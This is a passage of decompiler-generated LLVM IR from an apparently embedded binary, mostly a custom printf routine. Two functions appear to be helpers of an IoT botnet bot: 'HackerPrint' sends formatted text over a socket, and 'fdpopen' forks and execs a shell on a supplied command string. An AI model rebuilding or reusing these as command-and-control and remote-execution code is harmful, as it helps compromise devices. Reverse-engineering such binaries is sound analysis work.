  %stack_var_-4 = alloca i32, align 4
  store i32 35052, i32* %stack_var_-4, align 4
  %v2_88e8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_88e8, i32* @fp, align 4
  %stack_var_-28.428 = inttoptr i32 %arg2 to i8*
  %v2_8c9429 = load i8, i8* %stack_var_-28.428, align 1
  %v2_8c9831 = icmp eq i8 %v2_8c9429, 0
  br i1 %v2_8c9831, label %dec_label_pc_8ca0, label %dec_label_pc_8908.lr.ph

dec_label_pc_8908.lr.ph:                          ; preds = %entry
  %v5_8c4c = bitcast i32* %stack_var_-18 to i8*
  br label %dec_label_pc_8908

dec_label_pc_8908:                                ; preds = %dec_label_pc_8908.lr.ph, %dec_label_pc_8c84
  %stack_var_-28.435 = phi i8* [ %stack_var_-28.428, %dec_label_pc_8908.lr.ph ], [ %stack_var_-28.4, %dec_label_pc_8c84 ]
  %stack_var_-28.4.in34 = phi i32 [ %arg2, %dec_label_pc_8908.lr.ph ], [ %v1_8c88, %dec_label_pc_8c84 ]
  %stack_var_-32.133 = phi i32 [ %arg3, %dec_label_pc_8908.lr.ph ], [ %stack_var_-32.0, %dec_label_pc_8c84 ]
  %stack_var_-40.132 = phi i32 [ 0, %dec_label_pc_8908.lr.ph ], [ %stack_var_-40.0, %dec_label_pc_8c84 ]
  %v2_890c = load i8, i8* %stack_var_-28.435, align 1
  %v7_8910 = icmp eq i8 %v2_890c, 37
  br i1 %v7_8910, label %dec_label_pc_8918, label %dec_label_pc_8c64

dec_label_pc_8918:                                ; preds = %dec_label_pc_8908
  %v1_891c = add i32 %stack_var_-28.4.in34, 1
  %v5_8920 = inttoptr i32 %v1_891c to i8*
  %v2_8938 = load i8, i8* %v5_8920, align 1
  %v2_893c = icmp eq i8 %v2_8938, 0
  br i1 %v2_893c, label %dec_label_pc_8ca0, label %dec_label_pc_8944

dec_label_pc_8944:                                ; preds = %dec_label_pc_8918
  %v2_8948 = load i8, i8* %v5_8920, align 1
  %v7_894c = icmp eq i8 %v2_8948, 37
  br i1 %v7_894c, label %dec_label_pc_8c64, label %dec_label_pc_8954

dec_label_pc_8954:                                ; preds = %dec_label_pc_8944
  %v2_8958 = load i8, i8* %v5_8920, align 1
  %v7_895c = icmp eq i8 %v2_8958, 45
  br i1 %v7_895c, label %dec_label_pc_8964, label %dec_label_pc_8994.preheader

dec_label_pc_8964:                                ; preds = %dec_label_pc_8954
  %v1_8968 = add i32 %stack_var_-28.4.in34, 2
  %v5_896c = inttoptr i32 %v1_8968 to i8*
  br label %dec_label_pc_8994.preheader

dec_label_pc_8994.preheader:                      ; preds = %dec_label_pc_8964, %dec_label_pc_8954
  %stack_var_-28.0.ph = phi i8* [ %v5_8920, %dec_label_pc_8954 ], [ %v5_896c, %dec_label_pc_8964 ]
  %stack_var_-44.0.ph = phi i32 [ 0, %dec_label_pc_8954 ], [ 1, %dec_label_pc_8964 ]
  %v4_89942 = ptrtoint i8* %stack_var_-28.0.ph to i32
  %v2_89983 = load i8, i8* %stack_var_-28.0.ph, align 1
  %v7_899c7 = icmp eq i8 %v2_89983, 48
  br i1 %v7_899c7, label %dec_label_pc_897c, label %dec_label_pc_89e0.preheader

dec_label_pc_897c:                                ; preds = %dec_label_pc_8994.preheader, %dec_label_pc_897c
  %v4_89949 = phi i32 [ %v1_8980, %dec_label_pc_897c ], [ %v4_89942, %dec_label_pc_8994.preheader ]
  %stack_var_-44.08 = phi i32 [ %v1_898c, %dec_label_pc_897c ], [ %stack_var_-44.0.ph, %dec_label_pc_8994.preheader ]
  %v1_8980 = add i32 %v4_89949, 1
  %v5_8984 = inttoptr i32 %v1_8980 to i8*
  %v1_898c = or i32 %stack_var_-44.08, 2
  %v2_8998 = load i8, i8* %v5_8984, align 1
  %v7_899c = icmp eq i8 %v2_8998, 48
  br i1 %v7_899c, label %dec_label_pc_897c, label %dec_label_pc_89e0.preheader

dec_label_pc_89e0.preheader:                      ; preds = %dec_label_pc_897c, %dec_label_pc_8994.preheader
  %stack_var_-44.0.lcssa = phi i32 [ %stack_var_-44.0.ph, %dec_label_pc_8994.preheader ], [ %v1_898c, %dec_label_pc_897c ]
  %stack_var_-28.0.lcssa = phi i8* [ %stack_var_-28.0.ph, %dec_label_pc_8994.preheader ], [ %v5_8984, %dec_label_pc_897c ]
  %v4_89e011 = ptrtoint i8* %stack_var_-28.0.lcssa to i32
  %v2_89e412 = load i8, i8* %stack_var_-28.0.lcssa, align 1
  %tmp60 = icmp ult i8 %v2_89e412, 48
  br i1 %tmp60, label %dec_label_pc_8a00, label %dec_label_pc_89f0

dec_label_pc_89a8:                                ; preds = %dec_label_pc_89f0
  %v2_89b4 = mul i32 %stack_var_-48.019, 10
  %v2_89c0 = load i8, i8* %stack_var_-28.120, align 1
  %v3_89c0 = zext i8 %v2_89c0 to i32
  %v1_89c4 = add i32 %v2_89b4, -48
  %v2_89cc = add i32 %v1_89c4, %v3_89c0
  %v1_89d8 = add i32 %v4_89e021, 1
  %v5_89dc = inttoptr i32 %v1_89d8 to i8*
  %v2_89e4 = load i8, i8* %v5_89dc, align 1
  %tmp61 = icmp ult i8 %v2_89e4, 48
  br i1 %tmp61, label %dec_label_pc_8a00, label %dec_label_pc_89f0

dec_label_pc_89f0:                                ; preds = %dec_label_pc_89e0.preheader, %dec_label_pc_89a8
  %v4_89e021 = phi i32 [ %v1_89d8, %dec_label_pc_89a8 ], [ %v4_89e011, %dec_label_pc_89e0.preheader ]
  %stack_var_-28.120 = phi i8* [ %v5_89dc, %dec_label_pc_89a8 ], [ %stack_var_-28.0.lcssa, %dec_label_pc_89e0.preheader ]
  %stack_var_-48.019 = phi i32 [ %v2_89cc, %dec_label_pc_89a8 ], [ 0, %dec_label_pc_89e0.preheader ]
  %v2_89f4 = load i8, i8* %stack_var_-28.120, align 1
  %tmp62 = icmp ult i8 %v2_89f4, 58
  br i1 %tmp62, label %dec_label_pc_89a8, label %dec_label_pc_8a00

dec_label_pc_8a00:                                ; preds = %dec_label_pc_89a8, %dec_label_pc_89f0, %dec_label_pc_89e0.preheader
  %stack_var_-48.0.lcssa = phi i32 [ 0, %dec_label_pc_89e0.preheader ], [ %v2_89cc, %dec_label_pc_89a8 ], [ %stack_var_-48.019, %dec_label_pc_89f0 ]
  %stack_var_-28.1.lcssa = phi i8* [ %stack_var_-28.0.lcssa, %dec_label_pc_89e0.preheader ], [ %v5_89dc, %dec_label_pc_89a8 ], [ %stack_var_-28.120, %dec_label_pc_89f0 ]
  %v2_8a04 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8a08 = icmp eq i8 %v2_8a04, 115
  br i1 %v7_8a08, label %dec_label_pc_8a10, label %dec_label_pc_8a74

dec_label_pc_8a10:                                ; preds = %dec_label_pc_8a00
  %v1_8a14 = add i32 %stack_var_-32.133, 4
  %v1_8a20 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8a20 = load i32, i32* %v1_8a20, align 4
  %v2_8a2c = icmp eq i32 %v2_8a20, 0
  br i1 %v2_8a2c, label %dec_label_pc_8a40, label %dec_label_pc_8a34

dec_label_pc_8a34:                                ; preds = %dec_label_pc_8a10
  %v5_8a38 = inttoptr i32 %v2_8a20 to i8*
  br label %dec_label_pc_8a48

dec_label_pc_8a40:                                ; preds = %dec_label_pc_8a10
  br label %dec_label_pc_8a48

dec_label_pc_8a48:                                ; preds = %dec_label_pc_8a34, %dec_label_pc_8a40
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f500.35, i32 0, i32 0), %dec_label_pc_8a40 ], [ %v5_8a38, %dec_label_pc_8a34 ]
  %v7_8a5c = call i32 @prints(i32 %tmp, i8* %storemerge, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 ptrtoint (i32* @0 to i32))
  %v2_8a68 = add i32 %v7_8a5c, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8a74:                                ; preds = %dec_label_pc_8a00
  %v2_8a78 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8a7c = icmp eq i8 %v2_8a78, 100
  br i1 %v7_8a7c, label %dec_label_pc_8a84, label %dec_label_pc_8ad8

dec_label_pc_8a84:                                ; preds = %dec_label_pc_8a74
  %v1_8a88 = add i32 %stack_var_-32.133, 4
  %v1_8a94 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8a94 = load i32, i32* %v1_8a94, align 4
  %v7_8ac0 = call i32 @printi(i32 %tmp, i32 %v2_8a94, i32 10, i32 1, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8acc = add i32 %v7_8ac0, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8ad8:                                ; preds = %dec_label_pc_8a74
  %v2_8adc = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8ae0 = icmp eq i8 %v2_8adc, 120
  br i1 %v7_8ae0, label %dec_label_pc_8ae8, label %dec_label_pc_8b3c

dec_label_pc_8ae8:                                ; preds = %dec_label_pc_8ad8
  %v1_8aec = add i32 %stack_var_-32.133, 4
  %v1_8af8 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8af8 = load i32, i32* %v1_8af8, align 4
  %v7_8b24 = call i32 @printi(i32 %tmp, i32 %v2_8af8, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8b30 = add i32 %v7_8b24, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8b3c:                                ; preds = %dec_label_pc_8ad8
  %v2_8b40 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8b44 = icmp eq i8 %v2_8b40, 88
  br i1 %v7_8b44, label %dec_label_pc_8b4c, label %dec_label_pc_8ba0

dec_label_pc_8b4c:                                ; preds = %dec_label_pc_8b3c
  %v1_8b50 = add i32 %stack_var_-32.133, 4
  %v1_8b5c = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8b5c = load i32, i32* %v1_8b5c, align 4
  %v7_8b88 = call i32 @printi(i32 %tmp, i32 %v2_8b5c, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 65)
  %v2_8b94 = add i32 %v7_8b88, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8ba0:                                ; preds = %dec_label_pc_8b3c
  %v2_8ba4 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8ba8 = icmp eq i8 %v2_8ba4, 117
  br i1 %v7_8ba8, label %dec_label_pc_8bb0, label %dec_label_pc_8c04

dec_label_pc_8bb0:                                ; preds = %dec_label_pc_8ba0
  %v1_8bb4 = add i32 %stack_var_-32.133, 4
  %v1_8bc0 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8bc0 = load i32, i32* %v1_8bc0, align 4
  %v7_8bec = call i32 @printi(i32 %tmp, i32 %v2_8bc0, i32 10, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8bf8 = add i32 %v7_8bec, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8c04:                                ; preds = %dec_label_pc_8ba0
  %v2_8c08 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8c0c = icmp eq i8 %v2_8c08, 99
  br i1 %v7_8c0c, label %dec_label_pc_8c14, label %dec_label_pc_8c84

dec_label_pc_8c14:                                ; preds = %dec_label_pc_8c04
  %v1_8c18 = add i32 %stack_var_-32.133, 4
  %v1_8c24 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8c24 = load i32, i32* %v1_8c24, align 4
  %v1_8c28 = urem i32 %v2_8c24, 256
  store i32 %v1_8c28, i32* %stack_var_-18, align 4
  %v6_8c4c = call i32 @prints(i32 %tmp, i8* %v5_8c4c, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 %v1_8c18)
  %v2_8c58 = add i32 %v6_8c4c, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8c64:                                ; preds = %dec_label_pc_8908, %dec_label_pc_8944
  %stack_var_-28.2 = phi i8* [ %v5_8920, %dec_label_pc_8944 ], [ %stack_var_-28.435, %dec_label_pc_8908 ]
  %v2_8c68 = load i8, i8* %stack_var_-28.2, align 1
  %v3_8c68 = zext i8 %v2_8c68 to i32
  %v3_8c74 = call i32 @printchar(i32* %arg1, i32 %v3_8c68)
  %v1_8c7c = add i32 %stack_var_-40.132, 1
  br label %dec_label_pc_8c84

dec_label_pc_8c84:                                ; preds = %dec_label_pc_8c04, %dec_label_pc_8c14, %dec_label_pc_8bb0, %dec_label_pc_8b4c, %dec_label_pc_8ae8, %dec_label_pc_8a84, %dec_label_pc_8a48, %dec_label_pc_8c64
  %stack_var_-40.0 = phi i32 [ %v1_8c7c, %dec_label_pc_8c64 ], [ %v2_8a68, %dec_label_pc_8a48 ], [ %v2_8acc, %dec_label_pc_8a84 ], [ %v2_8b30, %dec_label_pc_8ae8 ], [ %v2_8b94, %dec_label_pc_8b4c ], [ %v2_8bf8, %dec_label_pc_8bb0 ], [ %v2_8c58, %dec_label_pc_8c14 ], [ %stack_var_-40.132, %dec_label_pc_8c04 ]
  %stack_var_-32.0 = phi i32 [ %stack_var_-32.133, %dec_label_pc_8c64 ], [ %v1_8a14, %dec_label_pc_8a48 ], [ %v1_8a88, %dec_label_pc_8a84 ], [ %v1_8aec, %dec_label_pc_8ae8 ], [ %v1_8b50, %dec_label_pc_8b4c ], [ %v1_8bb4, %dec_label_pc_8bb0 ], [ %v1_8c18, %dec_label_pc_8c14 ], [ %stack_var_-32.133, %dec_label_pc_8c04 ]
  %stack_var_-28.3 = phi i8* [ %stack_var_-28.2, %dec_label_pc_8c64 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8a48 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8a84 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8ae8 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8b4c ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8bb0 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8c14 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8c04 ]
  %v4_8c84 = ptrtoint i8* %stack_var_-28.3 to i32
  %v1_8c88 = add i32 %v4_8c84, 1
  %stack_var_-28.4 = inttoptr i32 %v1_8c88 to i8*
  %v2_8c94 = load i8, i8* %stack_var_-28.4, align 1
  %v2_8c98 = icmp eq i8 %v2_8c94, 0
  br i1 %v2_8c98, label %dec_label_pc_8ca0, label %dec_label_pc_8908

dec_label_pc_8ca0:                                ; preds = %dec_label_pc_8918, %dec_label_pc_8c84, %entry
  %stack_var_-40.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-40.132, %dec_label_pc_8918 ], [ %stack_var_-40.0, %dec_label_pc_8c84 ]
  %v2_8ca4 = icmp eq i32* %arg1, null
  br i1 %v2_8ca4, label %dec_label_pc_8cbc, label %dec_label_pc_8cac

dec_label_pc_8cac:                                ; preds = %dec_label_pc_8ca0
  %v2_8cb0 = load i32, i32* %arg1, align 4
  %v3_8cb8 = inttoptr i32 %v2_8cb0 to i8*
  store i8 0, i8* %v3_8cb8, align 1
  br label %dec_label_pc_8cbc

dec_label_pc_8cbc:                                ; preds = %dec_label_pc_8ca0, %dec_label_pc_8cac
  ret i32 %stack_var_-40.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-28.4, { 1, 0 }
  uselistorder i8* %stack_var_-28.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8* %stack_var_-28.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-44.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8980, { 1, 0 }
  uselistorder i32 %stack_var_-44.0.ph, { 1, 0 }
  uselistorder i8* %v5_8920, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-40.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-32.133, { 13, 0, 11, 12, 9, 10, 7, 8, 5, 6, 3, 4, 1, 2 }
  uselistorder i32 %stack_var_-28.4.in34, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-18, { 1, 0 }
  uselistorder i32 (i32*, i32)* @printchar, { 0, 4, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32, i32)* @prints, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_8cbc, { 1, 0 }
  uselistorder label %dec_label_pc_8ca0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8c84, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8c64, { 1, 0 }
  uselistorder label %dec_label_pc_8a48, { 1, 0 }
  uselistorder label %dec_label_pc_8a00, { 1, 0, 2 }
  uselistorder label %dec_label_pc_89f0, { 1, 0 }
  uselistorder label %dec_label_pc_897c, { 1, 0 }
  uselistorder label %dec_label_pc_8908, { 1, 0 }
}

define i32 @zprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-12, align 4
  store i32 36064, i32* %stack_var_-20, align 4
  %v2_8cdc = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8cdc, i32* @fp, align 4
  %v2_8ce4 = ptrtoint i32* %stack_var_-12 to i32
  %v4_8cfc = call i32 @print(i32* null, i32 %arg1, i32 %v2_8ce4)
  ret i32 %v4_8cfc

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8d18 = load i32, i32* @fp, align 4
  store i32 36128, i32* %stack_var_-16, align 4
  %v2_8d1c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d1c, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_8d28 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8d40 = call i32 @print(i32* nonnull %stack_var_-36, i32 %arg2, i32 %v2_8d28)
  store i32 %v3_8d18, i32* @fp, align 4
  ret i32 %v4_8d40

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @HackerPrint(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_8d58 = load i32, i32* @r2, align 4
  store i32 %v6_8d58, i32* %stack_var_-8, align 4
  %v3_8d5c = load i32, i32* @fp, align 4
  store i32 36196, i32* %stack_var_-16, align 4
  %v2_8d60 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d60, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-48, align 4
  %v1_8d70 = call i32 @malloc(i32 2048)
  store i32 %v1_8d70, i32* %stack_var_-40, align 4
  store i32 2048, i32* @r2, align 4
  %v2_8d8c = inttoptr i32 %v1_8d70 to i8*
  %v3_8d8c = call i32 @__GI_memset(i8* %v2_8d8c, i32 0)
  %v2_8d98 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8db8 = call i32 @print(i32* nonnull %stack_var_-40, i32 %arg2, i32 %v2_8d98)
  %v3_8dc0 = call i32 @strlen(i8* %v2_8d8c)
  %v2_8dd0 = add i32 %v3_8dc0, %v1_8d70
  %v3_8dd8 = inttoptr i32 %v2_8dd0 to i8*
  store i8 10, i8* %v3_8dd8, align 1
  %v3_8de0 = call i32 @strlen(i8* %v2_8d8c)
  %v3_8de8 = load i32, i32* %stack_var_-48, align 4
  %v4_8df8 = inttoptr i32 %v1_8d70 to i32*
  %v5_8df8 = call i32 @__libc_send(i32 %v3_8de8, i32* %v4_8df8, i32 %v3_8de0, i32 16384)
  store i32 %v1_8d70, i32* @r0, align 4
  %v0_8e08 = call i32 @free()
  store i32 %v3_8d5c, i32* @fp, align 4
  ret i32 %v5_8df8

; uselistorder directives
  uselistorder i8* %v2_8d8c, { 1, 0, 2 }
  uselistorder i32 %v1_8d70, { 1, 2, 0, 3, 4 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8e20 = load i32, i32* @fp, align 4
  store i32 36392, i32* %stack_var_-4, align 4
  %v2_8e24 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8e24, i32* @fp, align 4
  %v2_8e38 = load i8, i8* %arg2, align 1
  %v7_8e3c = icmp eq i8 %v2_8e38, 114
  br i1 %v7_8e3c, label %dec_label_pc_8e54, label %dec_label_pc_8e44

dec_label_pc_8e44:                                ; preds = %entry
  %v2_8e48 = load i8, i8* %arg2, align 1
  %v7_8e4c = icmp eq i8 %v2_8e48, 119
  br i1 %v7_8e4c, label %dec_label_pc_8e54, label %dec_label_pc_8e68

dec_label_pc_8e54:                                ; preds = %dec_label_pc_8e44, %entry
  %v1_8e58 = add i32 %tmp, 1
  %v1_8e5c = inttoptr i32 %v1_8e58 to i8*
  %v2_8e5c = load i8, i8* %v1_8e5c, align 1
  %v2_8e60 = icmp eq i8 %v2_8e5c, 0
  br i1 %v2_8e60, label %dec_label_pc_8e74, label %dec_label_pc_8e68

dec_label_pc_8e68:                                ; preds = %dec_label_pc_8e44, %dec_label_pc_8e54
  br label %dec_label_pc_9080

dec_label_pc_8e74:                                ; preds = %dec_label_pc_8e54
  %v2_8e74 = ptrtoint i32* %stack_var_-32 to i32
  %v1_8e7c = call i32 @__GI_pipe(i32 %v2_8e74)
  %v1_8e84 = icmp slt i32 %v1_8e7c, 0
  br i1 %v1_8e84, label %dec_label_pc_8e8c, label %dec_label_pc_8e98

dec_label_pc_8e8c:                                ; preds = %dec_label_pc_8e74
  br label %dec_label_pc_9080

dec_label_pc_8e98:                                ; preds = %dec_label_pc_8e74
  %v2_8e9c = load i32, i32* @global_var_32474.37, align 4
  %v2_8ea0 = icmp eq i32 %v2_8e9c, 0
  br i1 %v2_8ea0, label %dec_label_pc_8ea8, label %dec_label_pc_8f28

dec_label_pc_8ea8:                                ; preds = %dec_label_pc_8e98
  %v0_8ea8 = call i32 @getdtablesize()
  %v5_8ebc = icmp sgt i32 %v0_8ea8, 0
  br i1 %v5_8ebc, label %dec_label_pc_8ecc, label %dec_label_pc_8ec0

dec_label_pc_8ec0:                                ; preds = %dec_label_pc_8ea8
  br label %dec_label_pc_9080

dec_label_pc_8ecc:                                ; preds = %dec_label_pc_8ea8
  %v3_8ed0 = mul i32 %v0_8ea8, 4
  %v1_8ed8 = call i32 @malloc(i32 %v3_8ed0)
  store i32 %v1_8ed8, i32* @global_var_32474.37, align 4
  %v2_8ef4 = icmp eq i32 %v1_8ed8, 0
  br i1 %v2_8ef4, label %dec_label_pc_8efc, label %dec_label_pc_8f08

dec_label_pc_8efc:                                ; preds = %dec_label_pc_8ecc
  br label %dec_label_pc_9080

dec_label_pc_8f08:                                ; preds = %dec_label_pc_8ecc
  store i32 %v3_8ed0, i32* @r2, align 4
  %v2_8f24 = inttoptr i32 %v1_8ed8 to i8*
  %v3_8f24 = call i32 @__GI_memset(i8* %v2_8f24, i32 0)
  br label %dec_label_pc_8f28

dec_label_pc_8f28:                                ; preds = %dec_label_pc_8e98, %dec_label_pc_8f08
  %v0_8f28 = call i32 @__vfork()
  %v7_8f40 = icmp eq i32 %v0_8f28, -1
  br i1 %v7_8f40, label %dec_label_pc_8f58, label %dec_label_pc_8f48

dec_label_pc_8f48:                                ; preds = %dec_label_pc_8f28
  %v2_8f4c = icmp eq i32 %v0_8f28, 0
  %v2_8f80 = load i8, i8* %arg2, align 1
  %v7_8f84 = icmp eq i8 %v2_8f80, 114
  br i1 %v2_8f4c, label %dec_label_pc_8f7c, label %dec_label_pc_901c

dec_label_pc_8f58:                                ; preds = %dec_label_pc_8f28
  %v3_8f58 = load i32, i32* %stack_var_-32, align 4
  %v1_8f60 = call i32 @__GI_close(i32 %v3_8f58)
  %v1_8f6c = call i32 @__GI_close(i32 %tmp3)
  br label %dec_label_pc_9080

dec_label_pc_8f7c:                                ; preds = %dec_label_pc_8f48
  br i1 %v7_8f84, label %dec_label_pc_8f8c, label %dec_label_pc_8fc4

dec_label_pc_8f8c:                                ; preds = %dec_label_pc_8f7c
  %v7_8f90 = icmp eq i32 %tmp3, 1
  br i1 %v7_8f90, label %dec_label_pc_8fb4, label %dec_label_pc_8f98

dec_label_pc_8f98:                                ; preds = %dec_label_pc_8f8c
  %v0_8fa4 = call i32 @dup2()
  %v1_8fb0 = call i32 @__GI_close(i32 %tmp3)
  br label %dec_label_pc_8fb4

dec_label_pc_8fb4:                                ; preds = %dec_label_pc_8f8c, %dec_label_pc_8f98
  %v3_8fb4 = load i32, i32* %stack_var_-32, align 4
  %v1_8fbc = call i32 @__GI_close(i32 %v3_8fb4)
  br label %dec_label_pc_8ff8

dec_label_pc_8fc4:                                ; preds = %dec_label_pc_8f7c
  %v3_8fc4 = load i32, i32* %stack_var_-32, align 4
  %v2_8fc8 = icmp eq i32 %v3_8fc4, 0
  br i1 %v2_8fc8, label %dec_label_pc_8fec, label %dec_label_pc_8fd0

dec_label_pc_8fd0:                                ; preds = %dec_label_pc_8fc4
  %v0_8fdc = call i32 @dup2()
  %v3_8fe0 = load i32, i32* %stack_var_-32, align 4
  %v1_8fe8 = call i32 @__GI_close(i32 %v3_8fe0)
  br label %dec_label_pc_8fec

dec_label_pc_8fec:                                ; preds = %dec_label_pc_8fc4, %dec_label_pc_8fd0
  %v1_8ff4 = call i32 @__GI_close(i32 %tmp3)
  br label %dec_label_pc_8ff8

dec_label_pc_8ff8:                                ; preds = %dec_label_pc_8fb4, %dec_label_pc_8fec
  store i32 ptrtoint ([8 x i8]* @global_var_1f508.39 to i32), i32* @r0, align 4
  %v8_9010 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1f508.39 to i32), i32 ptrtoint ([3 x i8]* @global_var_1f510.41 to i32), i32 ptrtoint ([3 x i8]* @global_var_1f514.43 to i32), i32 %arg1, i32 0)
  %v1_9018 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_901c:                                ; preds = %dec_label_pc_8f48
  br i1 %v7_8f84, label %dec_label_pc_902c, label %dec_label_pc_9044

dec_label_pc_902c:                                ; preds = %dec_label_pc_901c
  %v3_902c = load i32, i32* %stack_var_-32, align 4
  %v1_903c = call i32 @__GI_close(i32 %tmp3)
  br label %dec_label_pc_9058

dec_label_pc_9044:                                ; preds = %dec_label_pc_901c
  %v3_904c = load i32, i32* %stack_var_-32, align 4
  %v1_9054 = call i32 @__GI_close(i32 %v3_904c)
  br label %dec_label_pc_9058

dec_label_pc_9058:                                ; preds = %dec_label_pc_902c, %dec_label_pc_9044
  %stack_var_-40.0 = phi i32 [ %v3_902c, %dec_label_pc_902c ], [ %tmp3, %dec_label_pc_9044 ]
  %v3_905c = mul i32 %stack_var_-40.0, 4
  %v2_9068 = load i32, i32* @global_var_32474.37, align 4
  %v2_906c = add i32 %v2_9068, %v3_905c
  %v2_9074 = inttoptr i32 %v2_906c to i32*
  store i32 %v0_8f28, i32* %v2_9074, align 4
  br label %dec_label_pc_9080

dec_label_pc_9080:                                ; preds = %dec_label_pc_8f58, %dec_label_pc_8efc, %dec_label_pc_8ec0, %dec_label_pc_8e8c, %dec_label_pc_8e68, %dec_label_pc_9058
  %stack_var_-44.0 = phi i32 [ -1, %dec_label_pc_8e8c ], [ -1, %dec_label_pc_8efc ], [ -1, %dec_label_pc_8f58 ], [ %stack_var_-40.0, %dec_label_pc_9058 ], [ -1, %dec_label_pc_8ec0 ], [ -1, %dec_label_pc_8e68 ]
  store i32 %v3_8e20, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v0_8f28, { 1, 2, 0 }
  uselistorder i32 %v3_8ed0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 5, 4, 3, 2, 1 }
  uselistorder i8* %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9080, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_9058, { 1, 0 }
  uselistorder label %dec_label_pc_8ff8, { 1, 0 }
  uselistorder label %dec_label_pc_8fec, { 1, 0 }
  uselistorder label %dec_label_pc_8fb4, { 1, 0 }
  uselistorder label %dec_label_pc_8f28, { 1, 0 }
  uselistorder label %dec_label_pc_8e68, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
